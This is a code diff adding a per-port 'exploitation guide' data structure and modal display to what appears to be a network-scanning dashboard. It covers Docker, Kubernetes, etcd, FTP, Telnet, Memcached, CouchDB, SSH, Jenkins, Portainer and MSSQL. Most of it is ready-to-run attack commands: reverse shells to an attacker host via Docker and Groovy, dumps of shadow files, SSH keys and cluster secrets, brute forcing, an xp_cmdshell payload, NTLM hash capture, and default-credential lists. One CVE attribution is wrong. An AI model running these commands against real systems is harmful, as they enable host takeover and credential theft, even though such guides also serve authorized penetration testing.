+                refs: ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc"]
+            },
+            2375: {
+                name: "Docker API",
+                risk: "critical",
+                description: "Docker API unencrypted - COMPLETE host compromise via container escape. Mount host filesystem, get root.",
+                attacks: [
+                    {
+                        title: "1. Enumerate Containers & Images",
+                        commands: [
+                            "docker -H tcp://<ip>:2375 ps -a",
+                            "docker -H tcp://<ip>:2375 images",
+                            "docker -H tcp://<ip>:2375 info",
+                            "curl http://<ip>:2375/containers/json",
+                            "curl http://<ip>:2375/images/json"
+                        ]
+                    },
+                    {
+                        title: "2. Get Root Shell on Host",
+                        commands: [
+                            "docker -H tcp://<ip>:2375 run -it -v /:/host alpine chroot /host /bin/bash",
+                            "# You now have root on the host!",
+                            "cat /host/etc/shadow",
+                            "# Add SSH key: echo 'ssh-rsa ...' >> /host/root/.ssh/authorized_keys"
+                        ]
+                    },
+                    {
+                        title: "3. Execute Commands in Existing Containers",
+                        commands: [
+                            "docker -H tcp://<ip>:2375 exec -it <container_id> /bin/sh",
+                            "docker -H tcp://<ip>:2375 exec <container_id> cat /etc/passwd"
+                        ]
+                    },
+                    {
+                        title: "4. Deploy Reverse Shell Container",
+                        commands: [
+                            "docker -H tcp://<ip>:2375 run -d --name pwned -v /:/host alpine sh -c 'chroot /host bash -i >& /dev/tcp/<attacker>/4444 0>&1'"
+                        ]
+                    },
+                    {
+                        title: "5. Read Sensitive Files",
+                        commands: [
+                            "docker -H tcp://<ip>:2375 run -v /etc:/etc:ro alpine cat /etc/shadow",
+                            "docker -H tcp://<ip>:2375 run -v /root:/root:ro alpine cat /root/.ssh/id_rsa",
+                            "docker -H tcp://<ip>:2375 run -v /var:/var:ro alpine cat /var/log/auth.log"
+                        ]
+                    }
+                ],
+                credentials: ["No authentication by default"],
+                cves: [],
+                tools: ["docker CLI", "curl", "Metasploit: use exploit/linux/http/docker_daemon_tcp"],
+                refs: ["https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker"]
+            },
+            2376: {
+                name: "Docker API (TLS)",
+                risk: "high",
+                description: "Docker API with TLS - if you obtain client certificates, same attacks as 2375 apply.",
+                attacks: [
+                    {
+                        title: "1. Check if TLS is Required",
+                        commands: [
+                            "curl -k https://<ip>:2376/info",
+                            "# If error, need client certs"
+                        ]
+                    },
+                    {
+                        title: "2. Connect with Certificates (if obtained)",
+                        commands: [
+                            "docker --tlsverify --tlscacert=ca.pem --tlscert=cert.pem --tlskey=key.pem -H tcp://<ip>:2376 ps",
+                            "# Then same attacks as port 2375"
+                        ]
+                    },
+                    {
+                        title: "3. Search for Leaked Certificates",
+                        commands: [
+                            "# Check GitHub, Docker configs, backups for:",
+                            "# ca.pem, cert.pem, key.pem, ca-key.pem",
+                            "# Common paths: ~/.docker/, /etc/docker/certs.d/"
+                        ]
+                    }
+                ],
+                credentials: ["Client certificate required"],
+                cves: [],
+                tools: ["docker CLI with --tls flags", "curl"],
+                refs: ["https://docs.docker.com/engine/security/protect-access/"]
+            },
+            6443: {
+                name: "Kubernetes API",
+                risk: "critical",
+                description: "Kubernetes API - cluster takeover possible. Deploy pods, steal secrets, escape to nodes.",
+                attacks: [
+                    {
+                        title: "1. Check for Anonymous Access",
+                        commands: [
+                            "kubectl --server=https://<ip>:6443 --insecure-skip-tls-verify get pods",
+                            "kubectl --server=https://<ip>:6443 --insecure-skip-tls-verify get namespaces",
+                            "curl -k https://<ip>:6443/api/v1/namespaces"
+                        ]
+                    },
+                    {
+                        title: "2. Steal Secrets",
+                        commands: [
+                            "kubectl --server=https://<ip>:6443 --insecure-skip-tls-verify get secrets --all-namespaces",
+                            "kubectl --server=https://<ip>:6443 --insecure-skip-tls-verify get secret <name> -o yaml",
+                            "# Decode: echo '<base64>' | base64 -d"
+                        ]
+                    },
+                    {
+                        title: "3. Deploy Malicious Pod",
+                        commands: [
+                            "# Create pod.yaml with hostPID, hostNetwork, privileged",
+                            "kubectl --server=https://<ip>:6443 --insecure-skip-tls-verify apply -f pod.yaml",
+                            "kubectl --server=https://<ip>:6443 --insecure-skip-tls-verify exec -it pwned -- /bin/bash"
+                        ]
+                    },
+                    {
+                        title: "4. Escape to Node (Privileged Pod)",
+                        commands: [
+                            "# In privileged pod:",
+                            "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash",
+                            "# Now you're root on the node!"
+                        ]
+                    },
+                    {
+                        title: "5. Service Account Token Theft",
+                        commands: [
+                            "# From any pod, read:",
+                            "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
+                            "# Use token: kubectl --token=<token> --server=https://<api>:6443 get pods"
+                        ]
+                    }
+                ],
+                credentials: ["Anonymous auth often enabled", "Service account tokens in pods"],
+                cves: ["CVE-2018-1002105 (Privilege escalation)", "CVE-2019-11247", "CVE-2019-11249"],
+                tools: ["kubectl", "kube-hunter", "kubeaudit", "peirates"],
+                refs: ["https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes"]
+            },
+            2379: {
+                name: "etcd",
+                risk: "critical",
+                description: "etcd key-value store - contains ALL Kubernetes secrets in PLAINTEXT. Complete cluster compromise.",
+                attacks: [
+                    {
+                        title: "1. Enumerate All Keys",
+                        commands: [
+                            "etcdctl --endpoints=http://<ip>:2379 get / --prefix --keys-only",
+                            "curl -L http://<ip>:2379/v2/keys/?recursive=true"
+                        ]
+                    },
+                    {
+                        title: "2. Dump All Kubernetes Secrets",
+                        commands: [
+                            "etcdctl --endpoints=http://<ip>:2379 get /registry/secrets --prefix",
+                            "# Secrets are base64 encoded, decode them:",
+                            "echo '<base64>' | base64 -d"
+                        ]
+                    },
+                    {
+                        title: "3. Get Service Account Tokens",
+                        commands: [
+                            "etcdctl --endpoints=http://<ip>:2379 get /registry/secrets/kube-system --prefix | grep token",
+                            "# Use token to authenticate to API server"
+                        ]
+                    },
+                    {
+                        title: "4. Extract TLS Certificates",
+                        commands: [
+                            "etcdctl --endpoints=http://<ip>:2379 get /registry/secrets/kube-system/default-token --prefix",
+                            "# Look for ca.crt, token data"
+                        ]
+                    },
+                    {
+                        title: "5. Modify Cluster State",
+                        commands: [
+                            "# Can inject malicious pods, modify RBAC, etc.",
+                            "etcdctl --endpoints=http://<ip>:2379 put /registry/pods/... <modified_data>"
+                        ]
+                    }
+                ],
+                credentials: ["No authentication by default"],
+                cves: [],
+                tools: ["etcdctl", "curl"],
+                refs: ["https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration#etcd"]
+            },
+            21: {
+                name: "FTP",
+                risk: "medium",
+                description: "FTP file transfer - cleartext protocol. Check for anonymous access, brute force, upload webshells.",
+                attacks: [
+                    {
+                        title: "1. Anonymous Login",
+                        commands: [
+                            "ftp <ip>",
+                            "# Username: anonymous",
+                            "# Password: anonymous or email@example.com",
+                            "ls -la",
+                            "get <file>"
+                        ]
+                    },
+                    {
+                        title: "2. Brute Force Credentials",
+                        commands: [
+                            "hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<ip>",
+                            "nmap --script ftp-brute -p 21 <ip>",
+                            "medusa -h <ip> -u admin -P passwords.txt -M ftp"
+                        ]
+                    },
+                    {
+                        title: "3. Upload Webshell (if writable)",
+                        commands: [
+                            "ftp <ip>",
+                            "cd /var/www/html",
+                            "put shell.php",
+                            "# Access: http://<ip>/shell.php"
+                        ]
+                    },
+                    {
+                        title: "4. Download All Files",
+                        commands: [
+                            "wget -r ftp://anonymous:anonymous@<ip>/",
+                            "# Or in ftp: mget *"
+                        ]
+                    },
+                    {
+                        title: "5. Bounce Attack (Port Scan)",
+                        commands: [
+                            "nmap -Pn -b anonymous@<ftp_ip> <target_ip>"
+                        ]
+                    }
+                ],
+                credentials: ["anonymous:anonymous", "anonymous:email@example.com", "ftp:ftp", "admin:admin", "user:user"],
+                cves: ["CVE-2010-4221 (ProFTPD)", "CVE-2015-3306 (ProFTPD mod_copy)"],
+                tools: ["ftp", "lftp", "wget", "Hydra", "Nmap ftp scripts"],
+                refs: ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp"]
+            },
+            23: {
+                name: "Telnet",
+                risk: "high",
+                description: "Telnet remote access - ALL traffic in cleartext including passwords. Easy to sniff and brute force.",
+                attacks: [
+                    {
+                        title: "1. Connect & Try Default Credentials",
+                        commands: [
+                            "telnet <ip>",
+                            "# Try: admin/admin, root/root, cisco/cisco"
+                        ]
+                    },
+                    {
+                        title: "2. Brute Force",
+                        commands: [
+                            "hydra -l admin -P passwords.txt telnet://<ip>",
+                            "nmap --script telnet-brute -p 23 <ip>",
+                            "medusa -h <ip> -u root -P passwords.txt -M telnet"
+                        ]
+                    },
+                    {
+                        title: "3. Sniff Credentials (MITM)",
+                        commands: [
+                            "# ARP spoof + Wireshark",
+                            "arpspoof -i eth0 -t <victim> <gateway>",
+                            "wireshark -i eth0 -f 'port 23'",
+                            "# Credentials visible in plaintext"
+                        ]
+                    },
+                    {
+                        title: "4. Network Device Exploitation",
+                        commands: [
+                            "# Cisco default: cisco/cisco, admin/admin",
+                            "# After login: enable, show running-config"
+                        ]
+                    }
+                ],
+                credentials: ["admin:admin", "root:root", "cisco:cisco", "admin:password", "administrator:administrator", "user:user"],
+                cves: [],
+                tools: ["telnet", "Hydra", "Medusa", "Nmap telnet scripts", "Wireshark"],
+                refs: ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-telnet"]
+            },
+            11211: {
+                name: "Memcached",
+                risk: "medium",
+                description: "Memcached cache - dump cached data (sessions, credentials). DDoS amplification possible.",
+                attacks: [
+                    {
+                        title: "1. Get Stats & Dump Keys",
+                        commands: [
+                            "echo 'stats' | nc <ip> 11211",
+                            "echo 'stats items' | nc <ip> 11211",
+                            "echo 'stats cachedump 1 100' | nc <ip> 11211",
+                            "echo 'stats slabs' | nc <ip> 11211"
+                        ]
+                    },
+                    {
+                        title: "2. Retrieve Cached Data",
+                        commands: [
+                            "echo 'get <key>' | nc <ip> 11211",
+                            "# Look for session tokens, credentials, API keys"
+                        ]
+                    },
+                    {
+                        title: "3. Dump All Keys & Values",
+                        commands: [
+                            "memcdump --servers=<ip>",
+                            "memccat --servers=<ip> <key>"
+                        ]
+                    },
+                    {
+                        title: "4. Session Hijacking",
+                        commands: [
+                            "# Find session keys",
+                            "echo 'stats cachedump 1 1000' | nc <ip> 11211 | grep session",
+                            "echo 'get session:<id>' | nc <ip> 11211",
+                            "# Use session cookie in browser"
+                        ]
+                    },
+                    {
+                        title: "5. DDoS Amplification (UDP)",
+                        commands: [
+                            "# Send small request, get large response",
+                            "# Spoof source IP for reflection attack",
+                            "# Up to 50,000x amplification factor"
+                        ]
+                    }
+                ],
+                credentials: ["No authentication by default"],
+                cves: ["CVE-2018-1000115 (DDoS amplification)"],
+                tools: ["nc (netcat)", "memccat", "memcdump", "Nmap: nmap -p 11211 --script memcached-info <ip>"],
+                refs: ["https://book.hacktricks.xyz/network-services-pentesting/11211-memcache"]
+            },
+            5984: {
+                name: "CouchDB",
+                risk: "high",
+                description: "CouchDB NoSQL database - REST API allows full access. Admin party mode = no auth.",
+                attacks: [
+                    {
+                        title: "1. Enumerate Databases",
+                        commands: [
+                            "curl http://<ip>:5984/",
+                            "curl http://<ip>:5984/_all_dbs",
+                            "curl http://<ip>:5984/_users/_all_docs"
+                        ]
+                    },
+                    {
+                        title: "2. Dump Database Contents",
+                        commands: [
+                            "curl http://<ip>:5984/<db>/_all_docs",
+                            "curl http://<ip>:5984/<db>/_all_docs?include_docs=true",
+                            "curl http://<ip>:5984/<db>/<doc_id>"
+                        ]
+                    },
+                    {
+                        title: "3. Create Admin User (Admin Party)",
+                        commands: [
+                            "curl -X PUT http://<ip>:5984/_config/admins/pwned -d 'password'",
+                            "# Now authenticate as pwned:password"
+                        ]
+                    },
+                    {
+                        title: "4. RCE via CVE-2017-12636",
+                        commands: [
+                            "# Requires admin access",
+                            "curl -X PUT 'http://admin:password@<ip>:5984/_config/query_servers/cmd' -d 'id >/tmp/out'"
+                        ]
+                    },
+                    {
+                        title: "5. Privilege Escalation (CVE-2017-12635)",
+                        commands: [
+                            "curl -X PUT http://<ip>:5984/_users/org.couchdb.user:pwned -H 'Content-Type: application/json' -d '{type:user,name:pwned,roles:[_admin],password:password}'"
+                        ]
+                    }
+                ],
+                credentials: ["Admin party (no auth)", "admin:admin", "root:root"],
+                cves: ["CVE-2017-12635 (Privilege escalation)", "CVE-2017-12636 (RCE)"],
+                tools: ["curl", "Nmap: nmap -p 5984 --script couchdb-stats <ip>"],
+                refs: ["https://book.hacktricks.xyz/network-services-pentesting/5984-pentesting-couchdb"]
+            },
+            22: {
+                name: "SSH",
+                risk: "info",
+                description: "SSH secure shell - generally secure but check for weak passwords, key reuse, version vulnerabilities.",
+                attacks: [
+                    {
+                        title: "1. Banner Grabbing & Version Check",
+                        commands: [
+                            "nc <ip> 22",
+                            "nmap -sV -p 22 <ip>",
+                            "ssh-audit <ip>"
+                        ]
+                    },
+                    {
+                        title: "2. Brute Force Credentials",
+                        commands: [
+                            "hydra -l root -P passwords.txt ssh://<ip>",
+                            "nmap --script ssh-brute -p 22 <ip>",
+                            "medusa -h <ip> -u root -P passwords.txt -M ssh"
+                        ]
+                    },
+                    {
+                        title: "3. Username Enumeration (Older OpenSSH)",
+                        commands: [
+                            "# CVE-2018-15473",
+                            "python ssh_user_enum.py <ip> -u root -p 22",
+                            "msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS <ip>; run'"
+                        ]
+                    },
+                    {
+                        title: "4. Check for Key Reuse",
+                        commands: [
+                            "# Try known/leaked private keys",
+                            "ssh -i id_rsa root@<ip>",
+                            "# Check Debian weak keys: https://github.com/g0tmi1k/debian-ssh"
+                        ]
+                    },
+                    {
+                        title: "5. Post-Auth: Steal Keys & Credentials",
+                        commands: [
+                            "cat ~/.ssh/id_rsa",
+                            "cat ~/.ssh/known_hosts",
+                            "cat /etc/shadow",
+                            "history"
+                        ]
+                    }
+                ],
+                credentials: ["root:root", "root:toor", "admin:admin", "user:user", "root:password"],
+                cves: ["CVE-2018-15473 (User enumeration)", "CVE-2016-0777/0778 (Roaming)"],
+                tools: ["ssh", "ssh-audit", "Hydra", "Medusa", "Nmap ssh scripts"],
+                refs: ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh"]
+            },
+            8080: {
+                name: "Jenkins",
+                risk: "high",
+                description: "Jenkins CI/CD - Script Console allows arbitrary Groovy code execution. Credential theft common.",
+                attacks: [
+                    {
+                        title: "1. Access Script Console (No Auth or Weak Auth)",
+                        commands: [
+                            "# Navigate to: http://<ip>:8080/script",
+                            "# Execute Groovy:",
+                            "'whoami'.execute().text",
+                            "'cat /etc/passwd'.execute().text"
+                        ]
+                    },
+                    {
+                        title: "2. Reverse Shell via Groovy",
+                        commands: [
+                            "String host='<attacker>';int port=4444;String cmd='/bin/bash';",
+                            "Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();",
+                            "Socket s=new Socket(host,port);",
+                            "InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();",
+                            "OutputStream po=p.getOutputStream(),so=s.getOutputStream();",
+                            "while(!s.isClosed()){/* stream handling */}"
+                        ]
+                    },
+                    {
+                        title: "3. Dump Credentials",
+                        commands: [
+                            "# In Script Console:",
+                            "com.cloudbees.plugins.credentials.SystemCredentialsProvider.getInstance().getCredentials().each{println it.dump()}",
+                            "# Or: http://<ip>:8080/credentials/"
+                        ]
+                    },
+                    {
+                        title: "4. Read Files via Groovy",
+                        commands: [
+                            "new File('/etc/passwd').text",
+                            "new File('/var/jenkins_home/secrets/master.key').text",
+                            "new File('/var/jenkins_home/secrets/hudson.util.Secret').text"
+                        ]
+                    },
+                    {
+                        title: "5. Create New Admin User",
+                        commands: [
+                            "# Via Groovy script to manipulate Jenkins config"
+                        ]
+                    }
+                ],
+                credentials: ["admin:admin", "admin:password", "jenkins:jenkins"],
+                cves: ["CVE-2019-1003000 (RCE)", "CVE-2018-1000861 (RCE)", "CVE-2017-1000353 (Deserialization)"],
+                tools: ["curl", "Browser", "Metasploit jenkins modules"],
+                refs: ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/jenkins"]
+            },
+            9000: {
+                name: "Portainer",
+                risk: "high",
+                description: "Portainer Docker management UI - provides easy Docker API access. Same risks as exposed Docker.",
+                attacks: [
+                    {
+                        title: "1. Default/Weak Credentials",
+                        commands: [
+                            "# Navigate to: http://<ip>:9000",
+                            "# Try: admin:admin, admin:portainer, admin:password"
+                        ]
+                    },
+                    {
+                        title: "2. Create Privileged Container (via UI)",
+                        commands: [
+                            "# Go to Containers > Add Container",
+                            "# Image: alpine",
+                            "# Command: /bin/sh",
+                            "# Volumes: Bind /:/host",
+                            "# Privileged mode: ON",
+                            "# Console: Connect to get root on host"
+                        ]
+                    },
+                    {
+                        title: "3. Access Console of Existing Containers",
+                        commands: [
+                            "# Go to Containers > [container] > Console",
+                            "# Search for credentials, keys, configs"
+                        ]
+                    },
+                    {
+                        title: "4. Steal Environment Variables",
+                        commands: [
+                            "# Go to Containers > [container] > Inspect",
+                            "# Check Env for passwords, API keys"
+                        ]
+                    }
+                ],
+                credentials: ["admin:admin", "admin:portainer", "admin:password"],
+                cves: ["CVE-2022-26134"],
+                tools: ["Browser", "curl"],
+                refs: ["https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-portainer"]
+            },
+            1433: {
+                name: "MSSQL",
+                risk: "high",
+                description: "Microsoft SQL Server - xp_cmdshell enables OS command execution. Often has sa with weak password.",
+                attacks: [
+                    {
+                        title: "1. Brute Force SA Account",
+                        commands: [
+                            "hydra -l sa -P passwords.txt mssql://<ip>",
+                            "nmap --script ms-sql-brute -p 1433 <ip>",
+                            "crackmapexec mssql <ip> -u sa -p passwords.txt"
+                        ]
+                    },
+                    {
+                        title: "2. Connect & Enumerate",
+                        commands: [
+                            "sqsh -S <ip> -U sa -P '<password>'",
+                            "SELECT name FROM master.dbo.sysdatabases;",
+                            "SELECT * FROM <db>.dbo.sysobjects WHERE xtype='U';",
+                            "SELECT * FROM <db>.dbo.<table>;"
+                        ]
+                    },
+                    {
+                        title: "3. Enable & Use xp_cmdshell",
+                        commands: [
+                            "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
+                            "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
+                            "EXEC xp_cmdshell 'whoami';",
+                            "EXEC xp_cmdshell 'powershell -e <base64_payload>';"
+                        ]
+                    },
+                    {
+                        title: "4. Steal NTLM Hash",
+                        commands: [
+                            "# Start Responder: responder -I eth0",
+                            "EXEC xp_dirtree '\\\\\\\\<attacker>\\\\share';",
+                            "# Crack with hashcat -m 5600"
+                        ]
+                    },
+                    {
+                        title: "5. Read Files",
+                        commands: [
+                            "SELECT * FROM OPENROWSET(BULK 'C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts', SINGLE_CLOB) AS Contents;"
+                        ]
+                    }
+                ],
+                credentials: ["sa:sa", "sa:password", "sa:P@ssw0rd", "sa:1234", "sa (blank)"],
+                cves: ["CVE-2020-0618 (RCE)"],
+                tools: ["sqsh", "mssqlclient.py (Impacket)", "CrackMapExec", "SQLMap", "Nmap ms-sql scripts"],
+                refs: ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server"]
+            }
+        };
+
+        function showServiceGuide(port) {
+            const guide = serviceGuides[port];
+            if (!guide) {
+                alert('No exploitation guide available for port ' + port);
+                return;
+            }
+
+            const modal = document.getElementById('serviceGuideModal');
+            const content = document.getElementById('serviceGuideContent');
+
+            // Build attacks HTML with command blocks
+            let attacksHtml = '';
+            if (guide.attacks && guide.attacks.length > 0) {
+                attacksHtml = guide.attacks.map(attack => `
+                    <div style="margin-bottom: 20px; background: var(--bg-base); border-radius: var(--radius-md); padding: 16px; border: 1px solid var(--border-subtle);">
+                        <h5 style="color: var(--color-danger); margin-bottom: 12px; font-size: 14px;">${attack.title}</h5>
+                        <div style="background: #0d1117; border-radius: 6px; padding: 12px; overflow-x: auto;">
+                            <pre style="margin: 0; color: #c9d1d9; font-family: 'SF Mono', Consolas, monospace; font-size: 12px; line-height: 1.6; white-space: pre-wrap;">${attack.commands.join('\\n')}</pre>
+                        </div>
+                    </div>
+                `).join('');
+            }
+
+            let html = `
+                <div class="service-guide">
+                    <h3 style="display: flex; align-items: center; gap: 12px; margin-bottom: 16px; padding-bottom: 12px; border-bottom: 1px solid var(--border-subtle);">
+                        <span class="risk-badge risk-${guide.risk}">${guide.risk.toUpperCase()}</span>
+                        <span style="font-size: 20px;">🔓 ${guide.name} Exploitation - Port ${port}</span>
+                    </h3>
+                    <p style="color: var(--text-secondary); margin-bottom: 24px; line-height: 1.6; font-size: 14px;">${guide.description}</p>
+
+                    <div style="margin-bottom: 24px;">
+                        <h4 style="color: var(--color-danger); margin-bottom: 16px; font-size: 16px; display: flex; align-items: center; gap: 8px;">
+                            <span>🎯</span> Exploitation Techniques
+                        </h4>
+                        ${attacksHtml}
+                    </div>
+
+                    ${guide.credentials && guide.credentials.length > 0 ? `
+                    <div style="margin-bottom: 24px; padding: 16px; background: var(--color-warning-muted); border-radius: var(--radius-md); border: 1px solid rgba(251, 191, 36, 0.3);">
+                        <h4 style="color: var(--color-warning); margin-bottom: 12px; font-size: 14px;">🔑 Default Credentials to Try</h4>
+                        <div style="display: flex; flex-wrap: wrap; gap: 8px;">
+                            ${guide.credentials.map(c => `<code style="background: rgba(0,0,0,0.3); padding: 4px 10px; border-radius: 4px; font-size: 13px; color: var(--color-warning);">${c}</code>`).join('')}
+                        </div>
+                    </div>
+                    ` : ''}
+
+                    ${guide.cves && guide.cves.length > 0 ? `
+                    <div style="margin-bottom: 24px;">
+                        <h4 style="color: var(--text-secondary); margin-bottom: 12px; font-size: 14px;">🐛 Known CVEs to Check</h4>
+                        <div style="display: flex; flex-wrap: wrap; gap: 8px;">
+                            ${guide.cves.map(c => `<span style="background: var(--color-danger-muted); color: var(--color-danger); padding: 4px 10px; border-radius: 4px; font-size: 12px;">${c}</span>`).join('')}
+                        </div>
+                    </div>
+                    ` : ''}
+
+                    <div style="margin-bottom: 24px;">
+                        <h4 style="color: var(--text-secondary); margin-bottom: 12px; font-size: 14px;">🔧 Tools</h4>
+                        <div style="display: flex; flex-wrap: wrap; gap: 8px;">
+                            ${guide.tools.map(t => `<span style="background: var(--accent-primary-muted); color: var(--accent-primary); padding: 4px 10px; border-radius: 4px; font-size: 12px;">${t}</span>`).join('')}
+                        </div>
+                    </div>
+
+                    <div>
+                        <h4 style="color: var(--text-secondary); margin-bottom: 12px; font-size: 14px;">📚 References</h4>
+                        <ul style="margin: 0; padding-left: 20px;">
+                            ${guide.refs.map(r => `<li style="margin-bottom: 6px;"><a href="${r}" target="_blank" style="color: var(--accent-primary); text-decoration: none; word-break: break-all;">${r}</a></li>`).join('')}
+                        </ul>
+                    </div>
+                </div>
+            `;
+
+            content.innerHTML = html;
+            modal.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeServiceGuide(event) {
+            if (event && event.target !== event.currentTarget && !event.target.classList.contains('modal-close')) {
+                return;
+            }
+            const modal = document.getElementById('serviceGuideModal');
+            modal.classList.remove('active');
+            document.body.style.overflow = 'auto';
+        }
 
         // Smooth scroll for nav links
         document.querySelectorAll('.nav-item').forEach(link => {
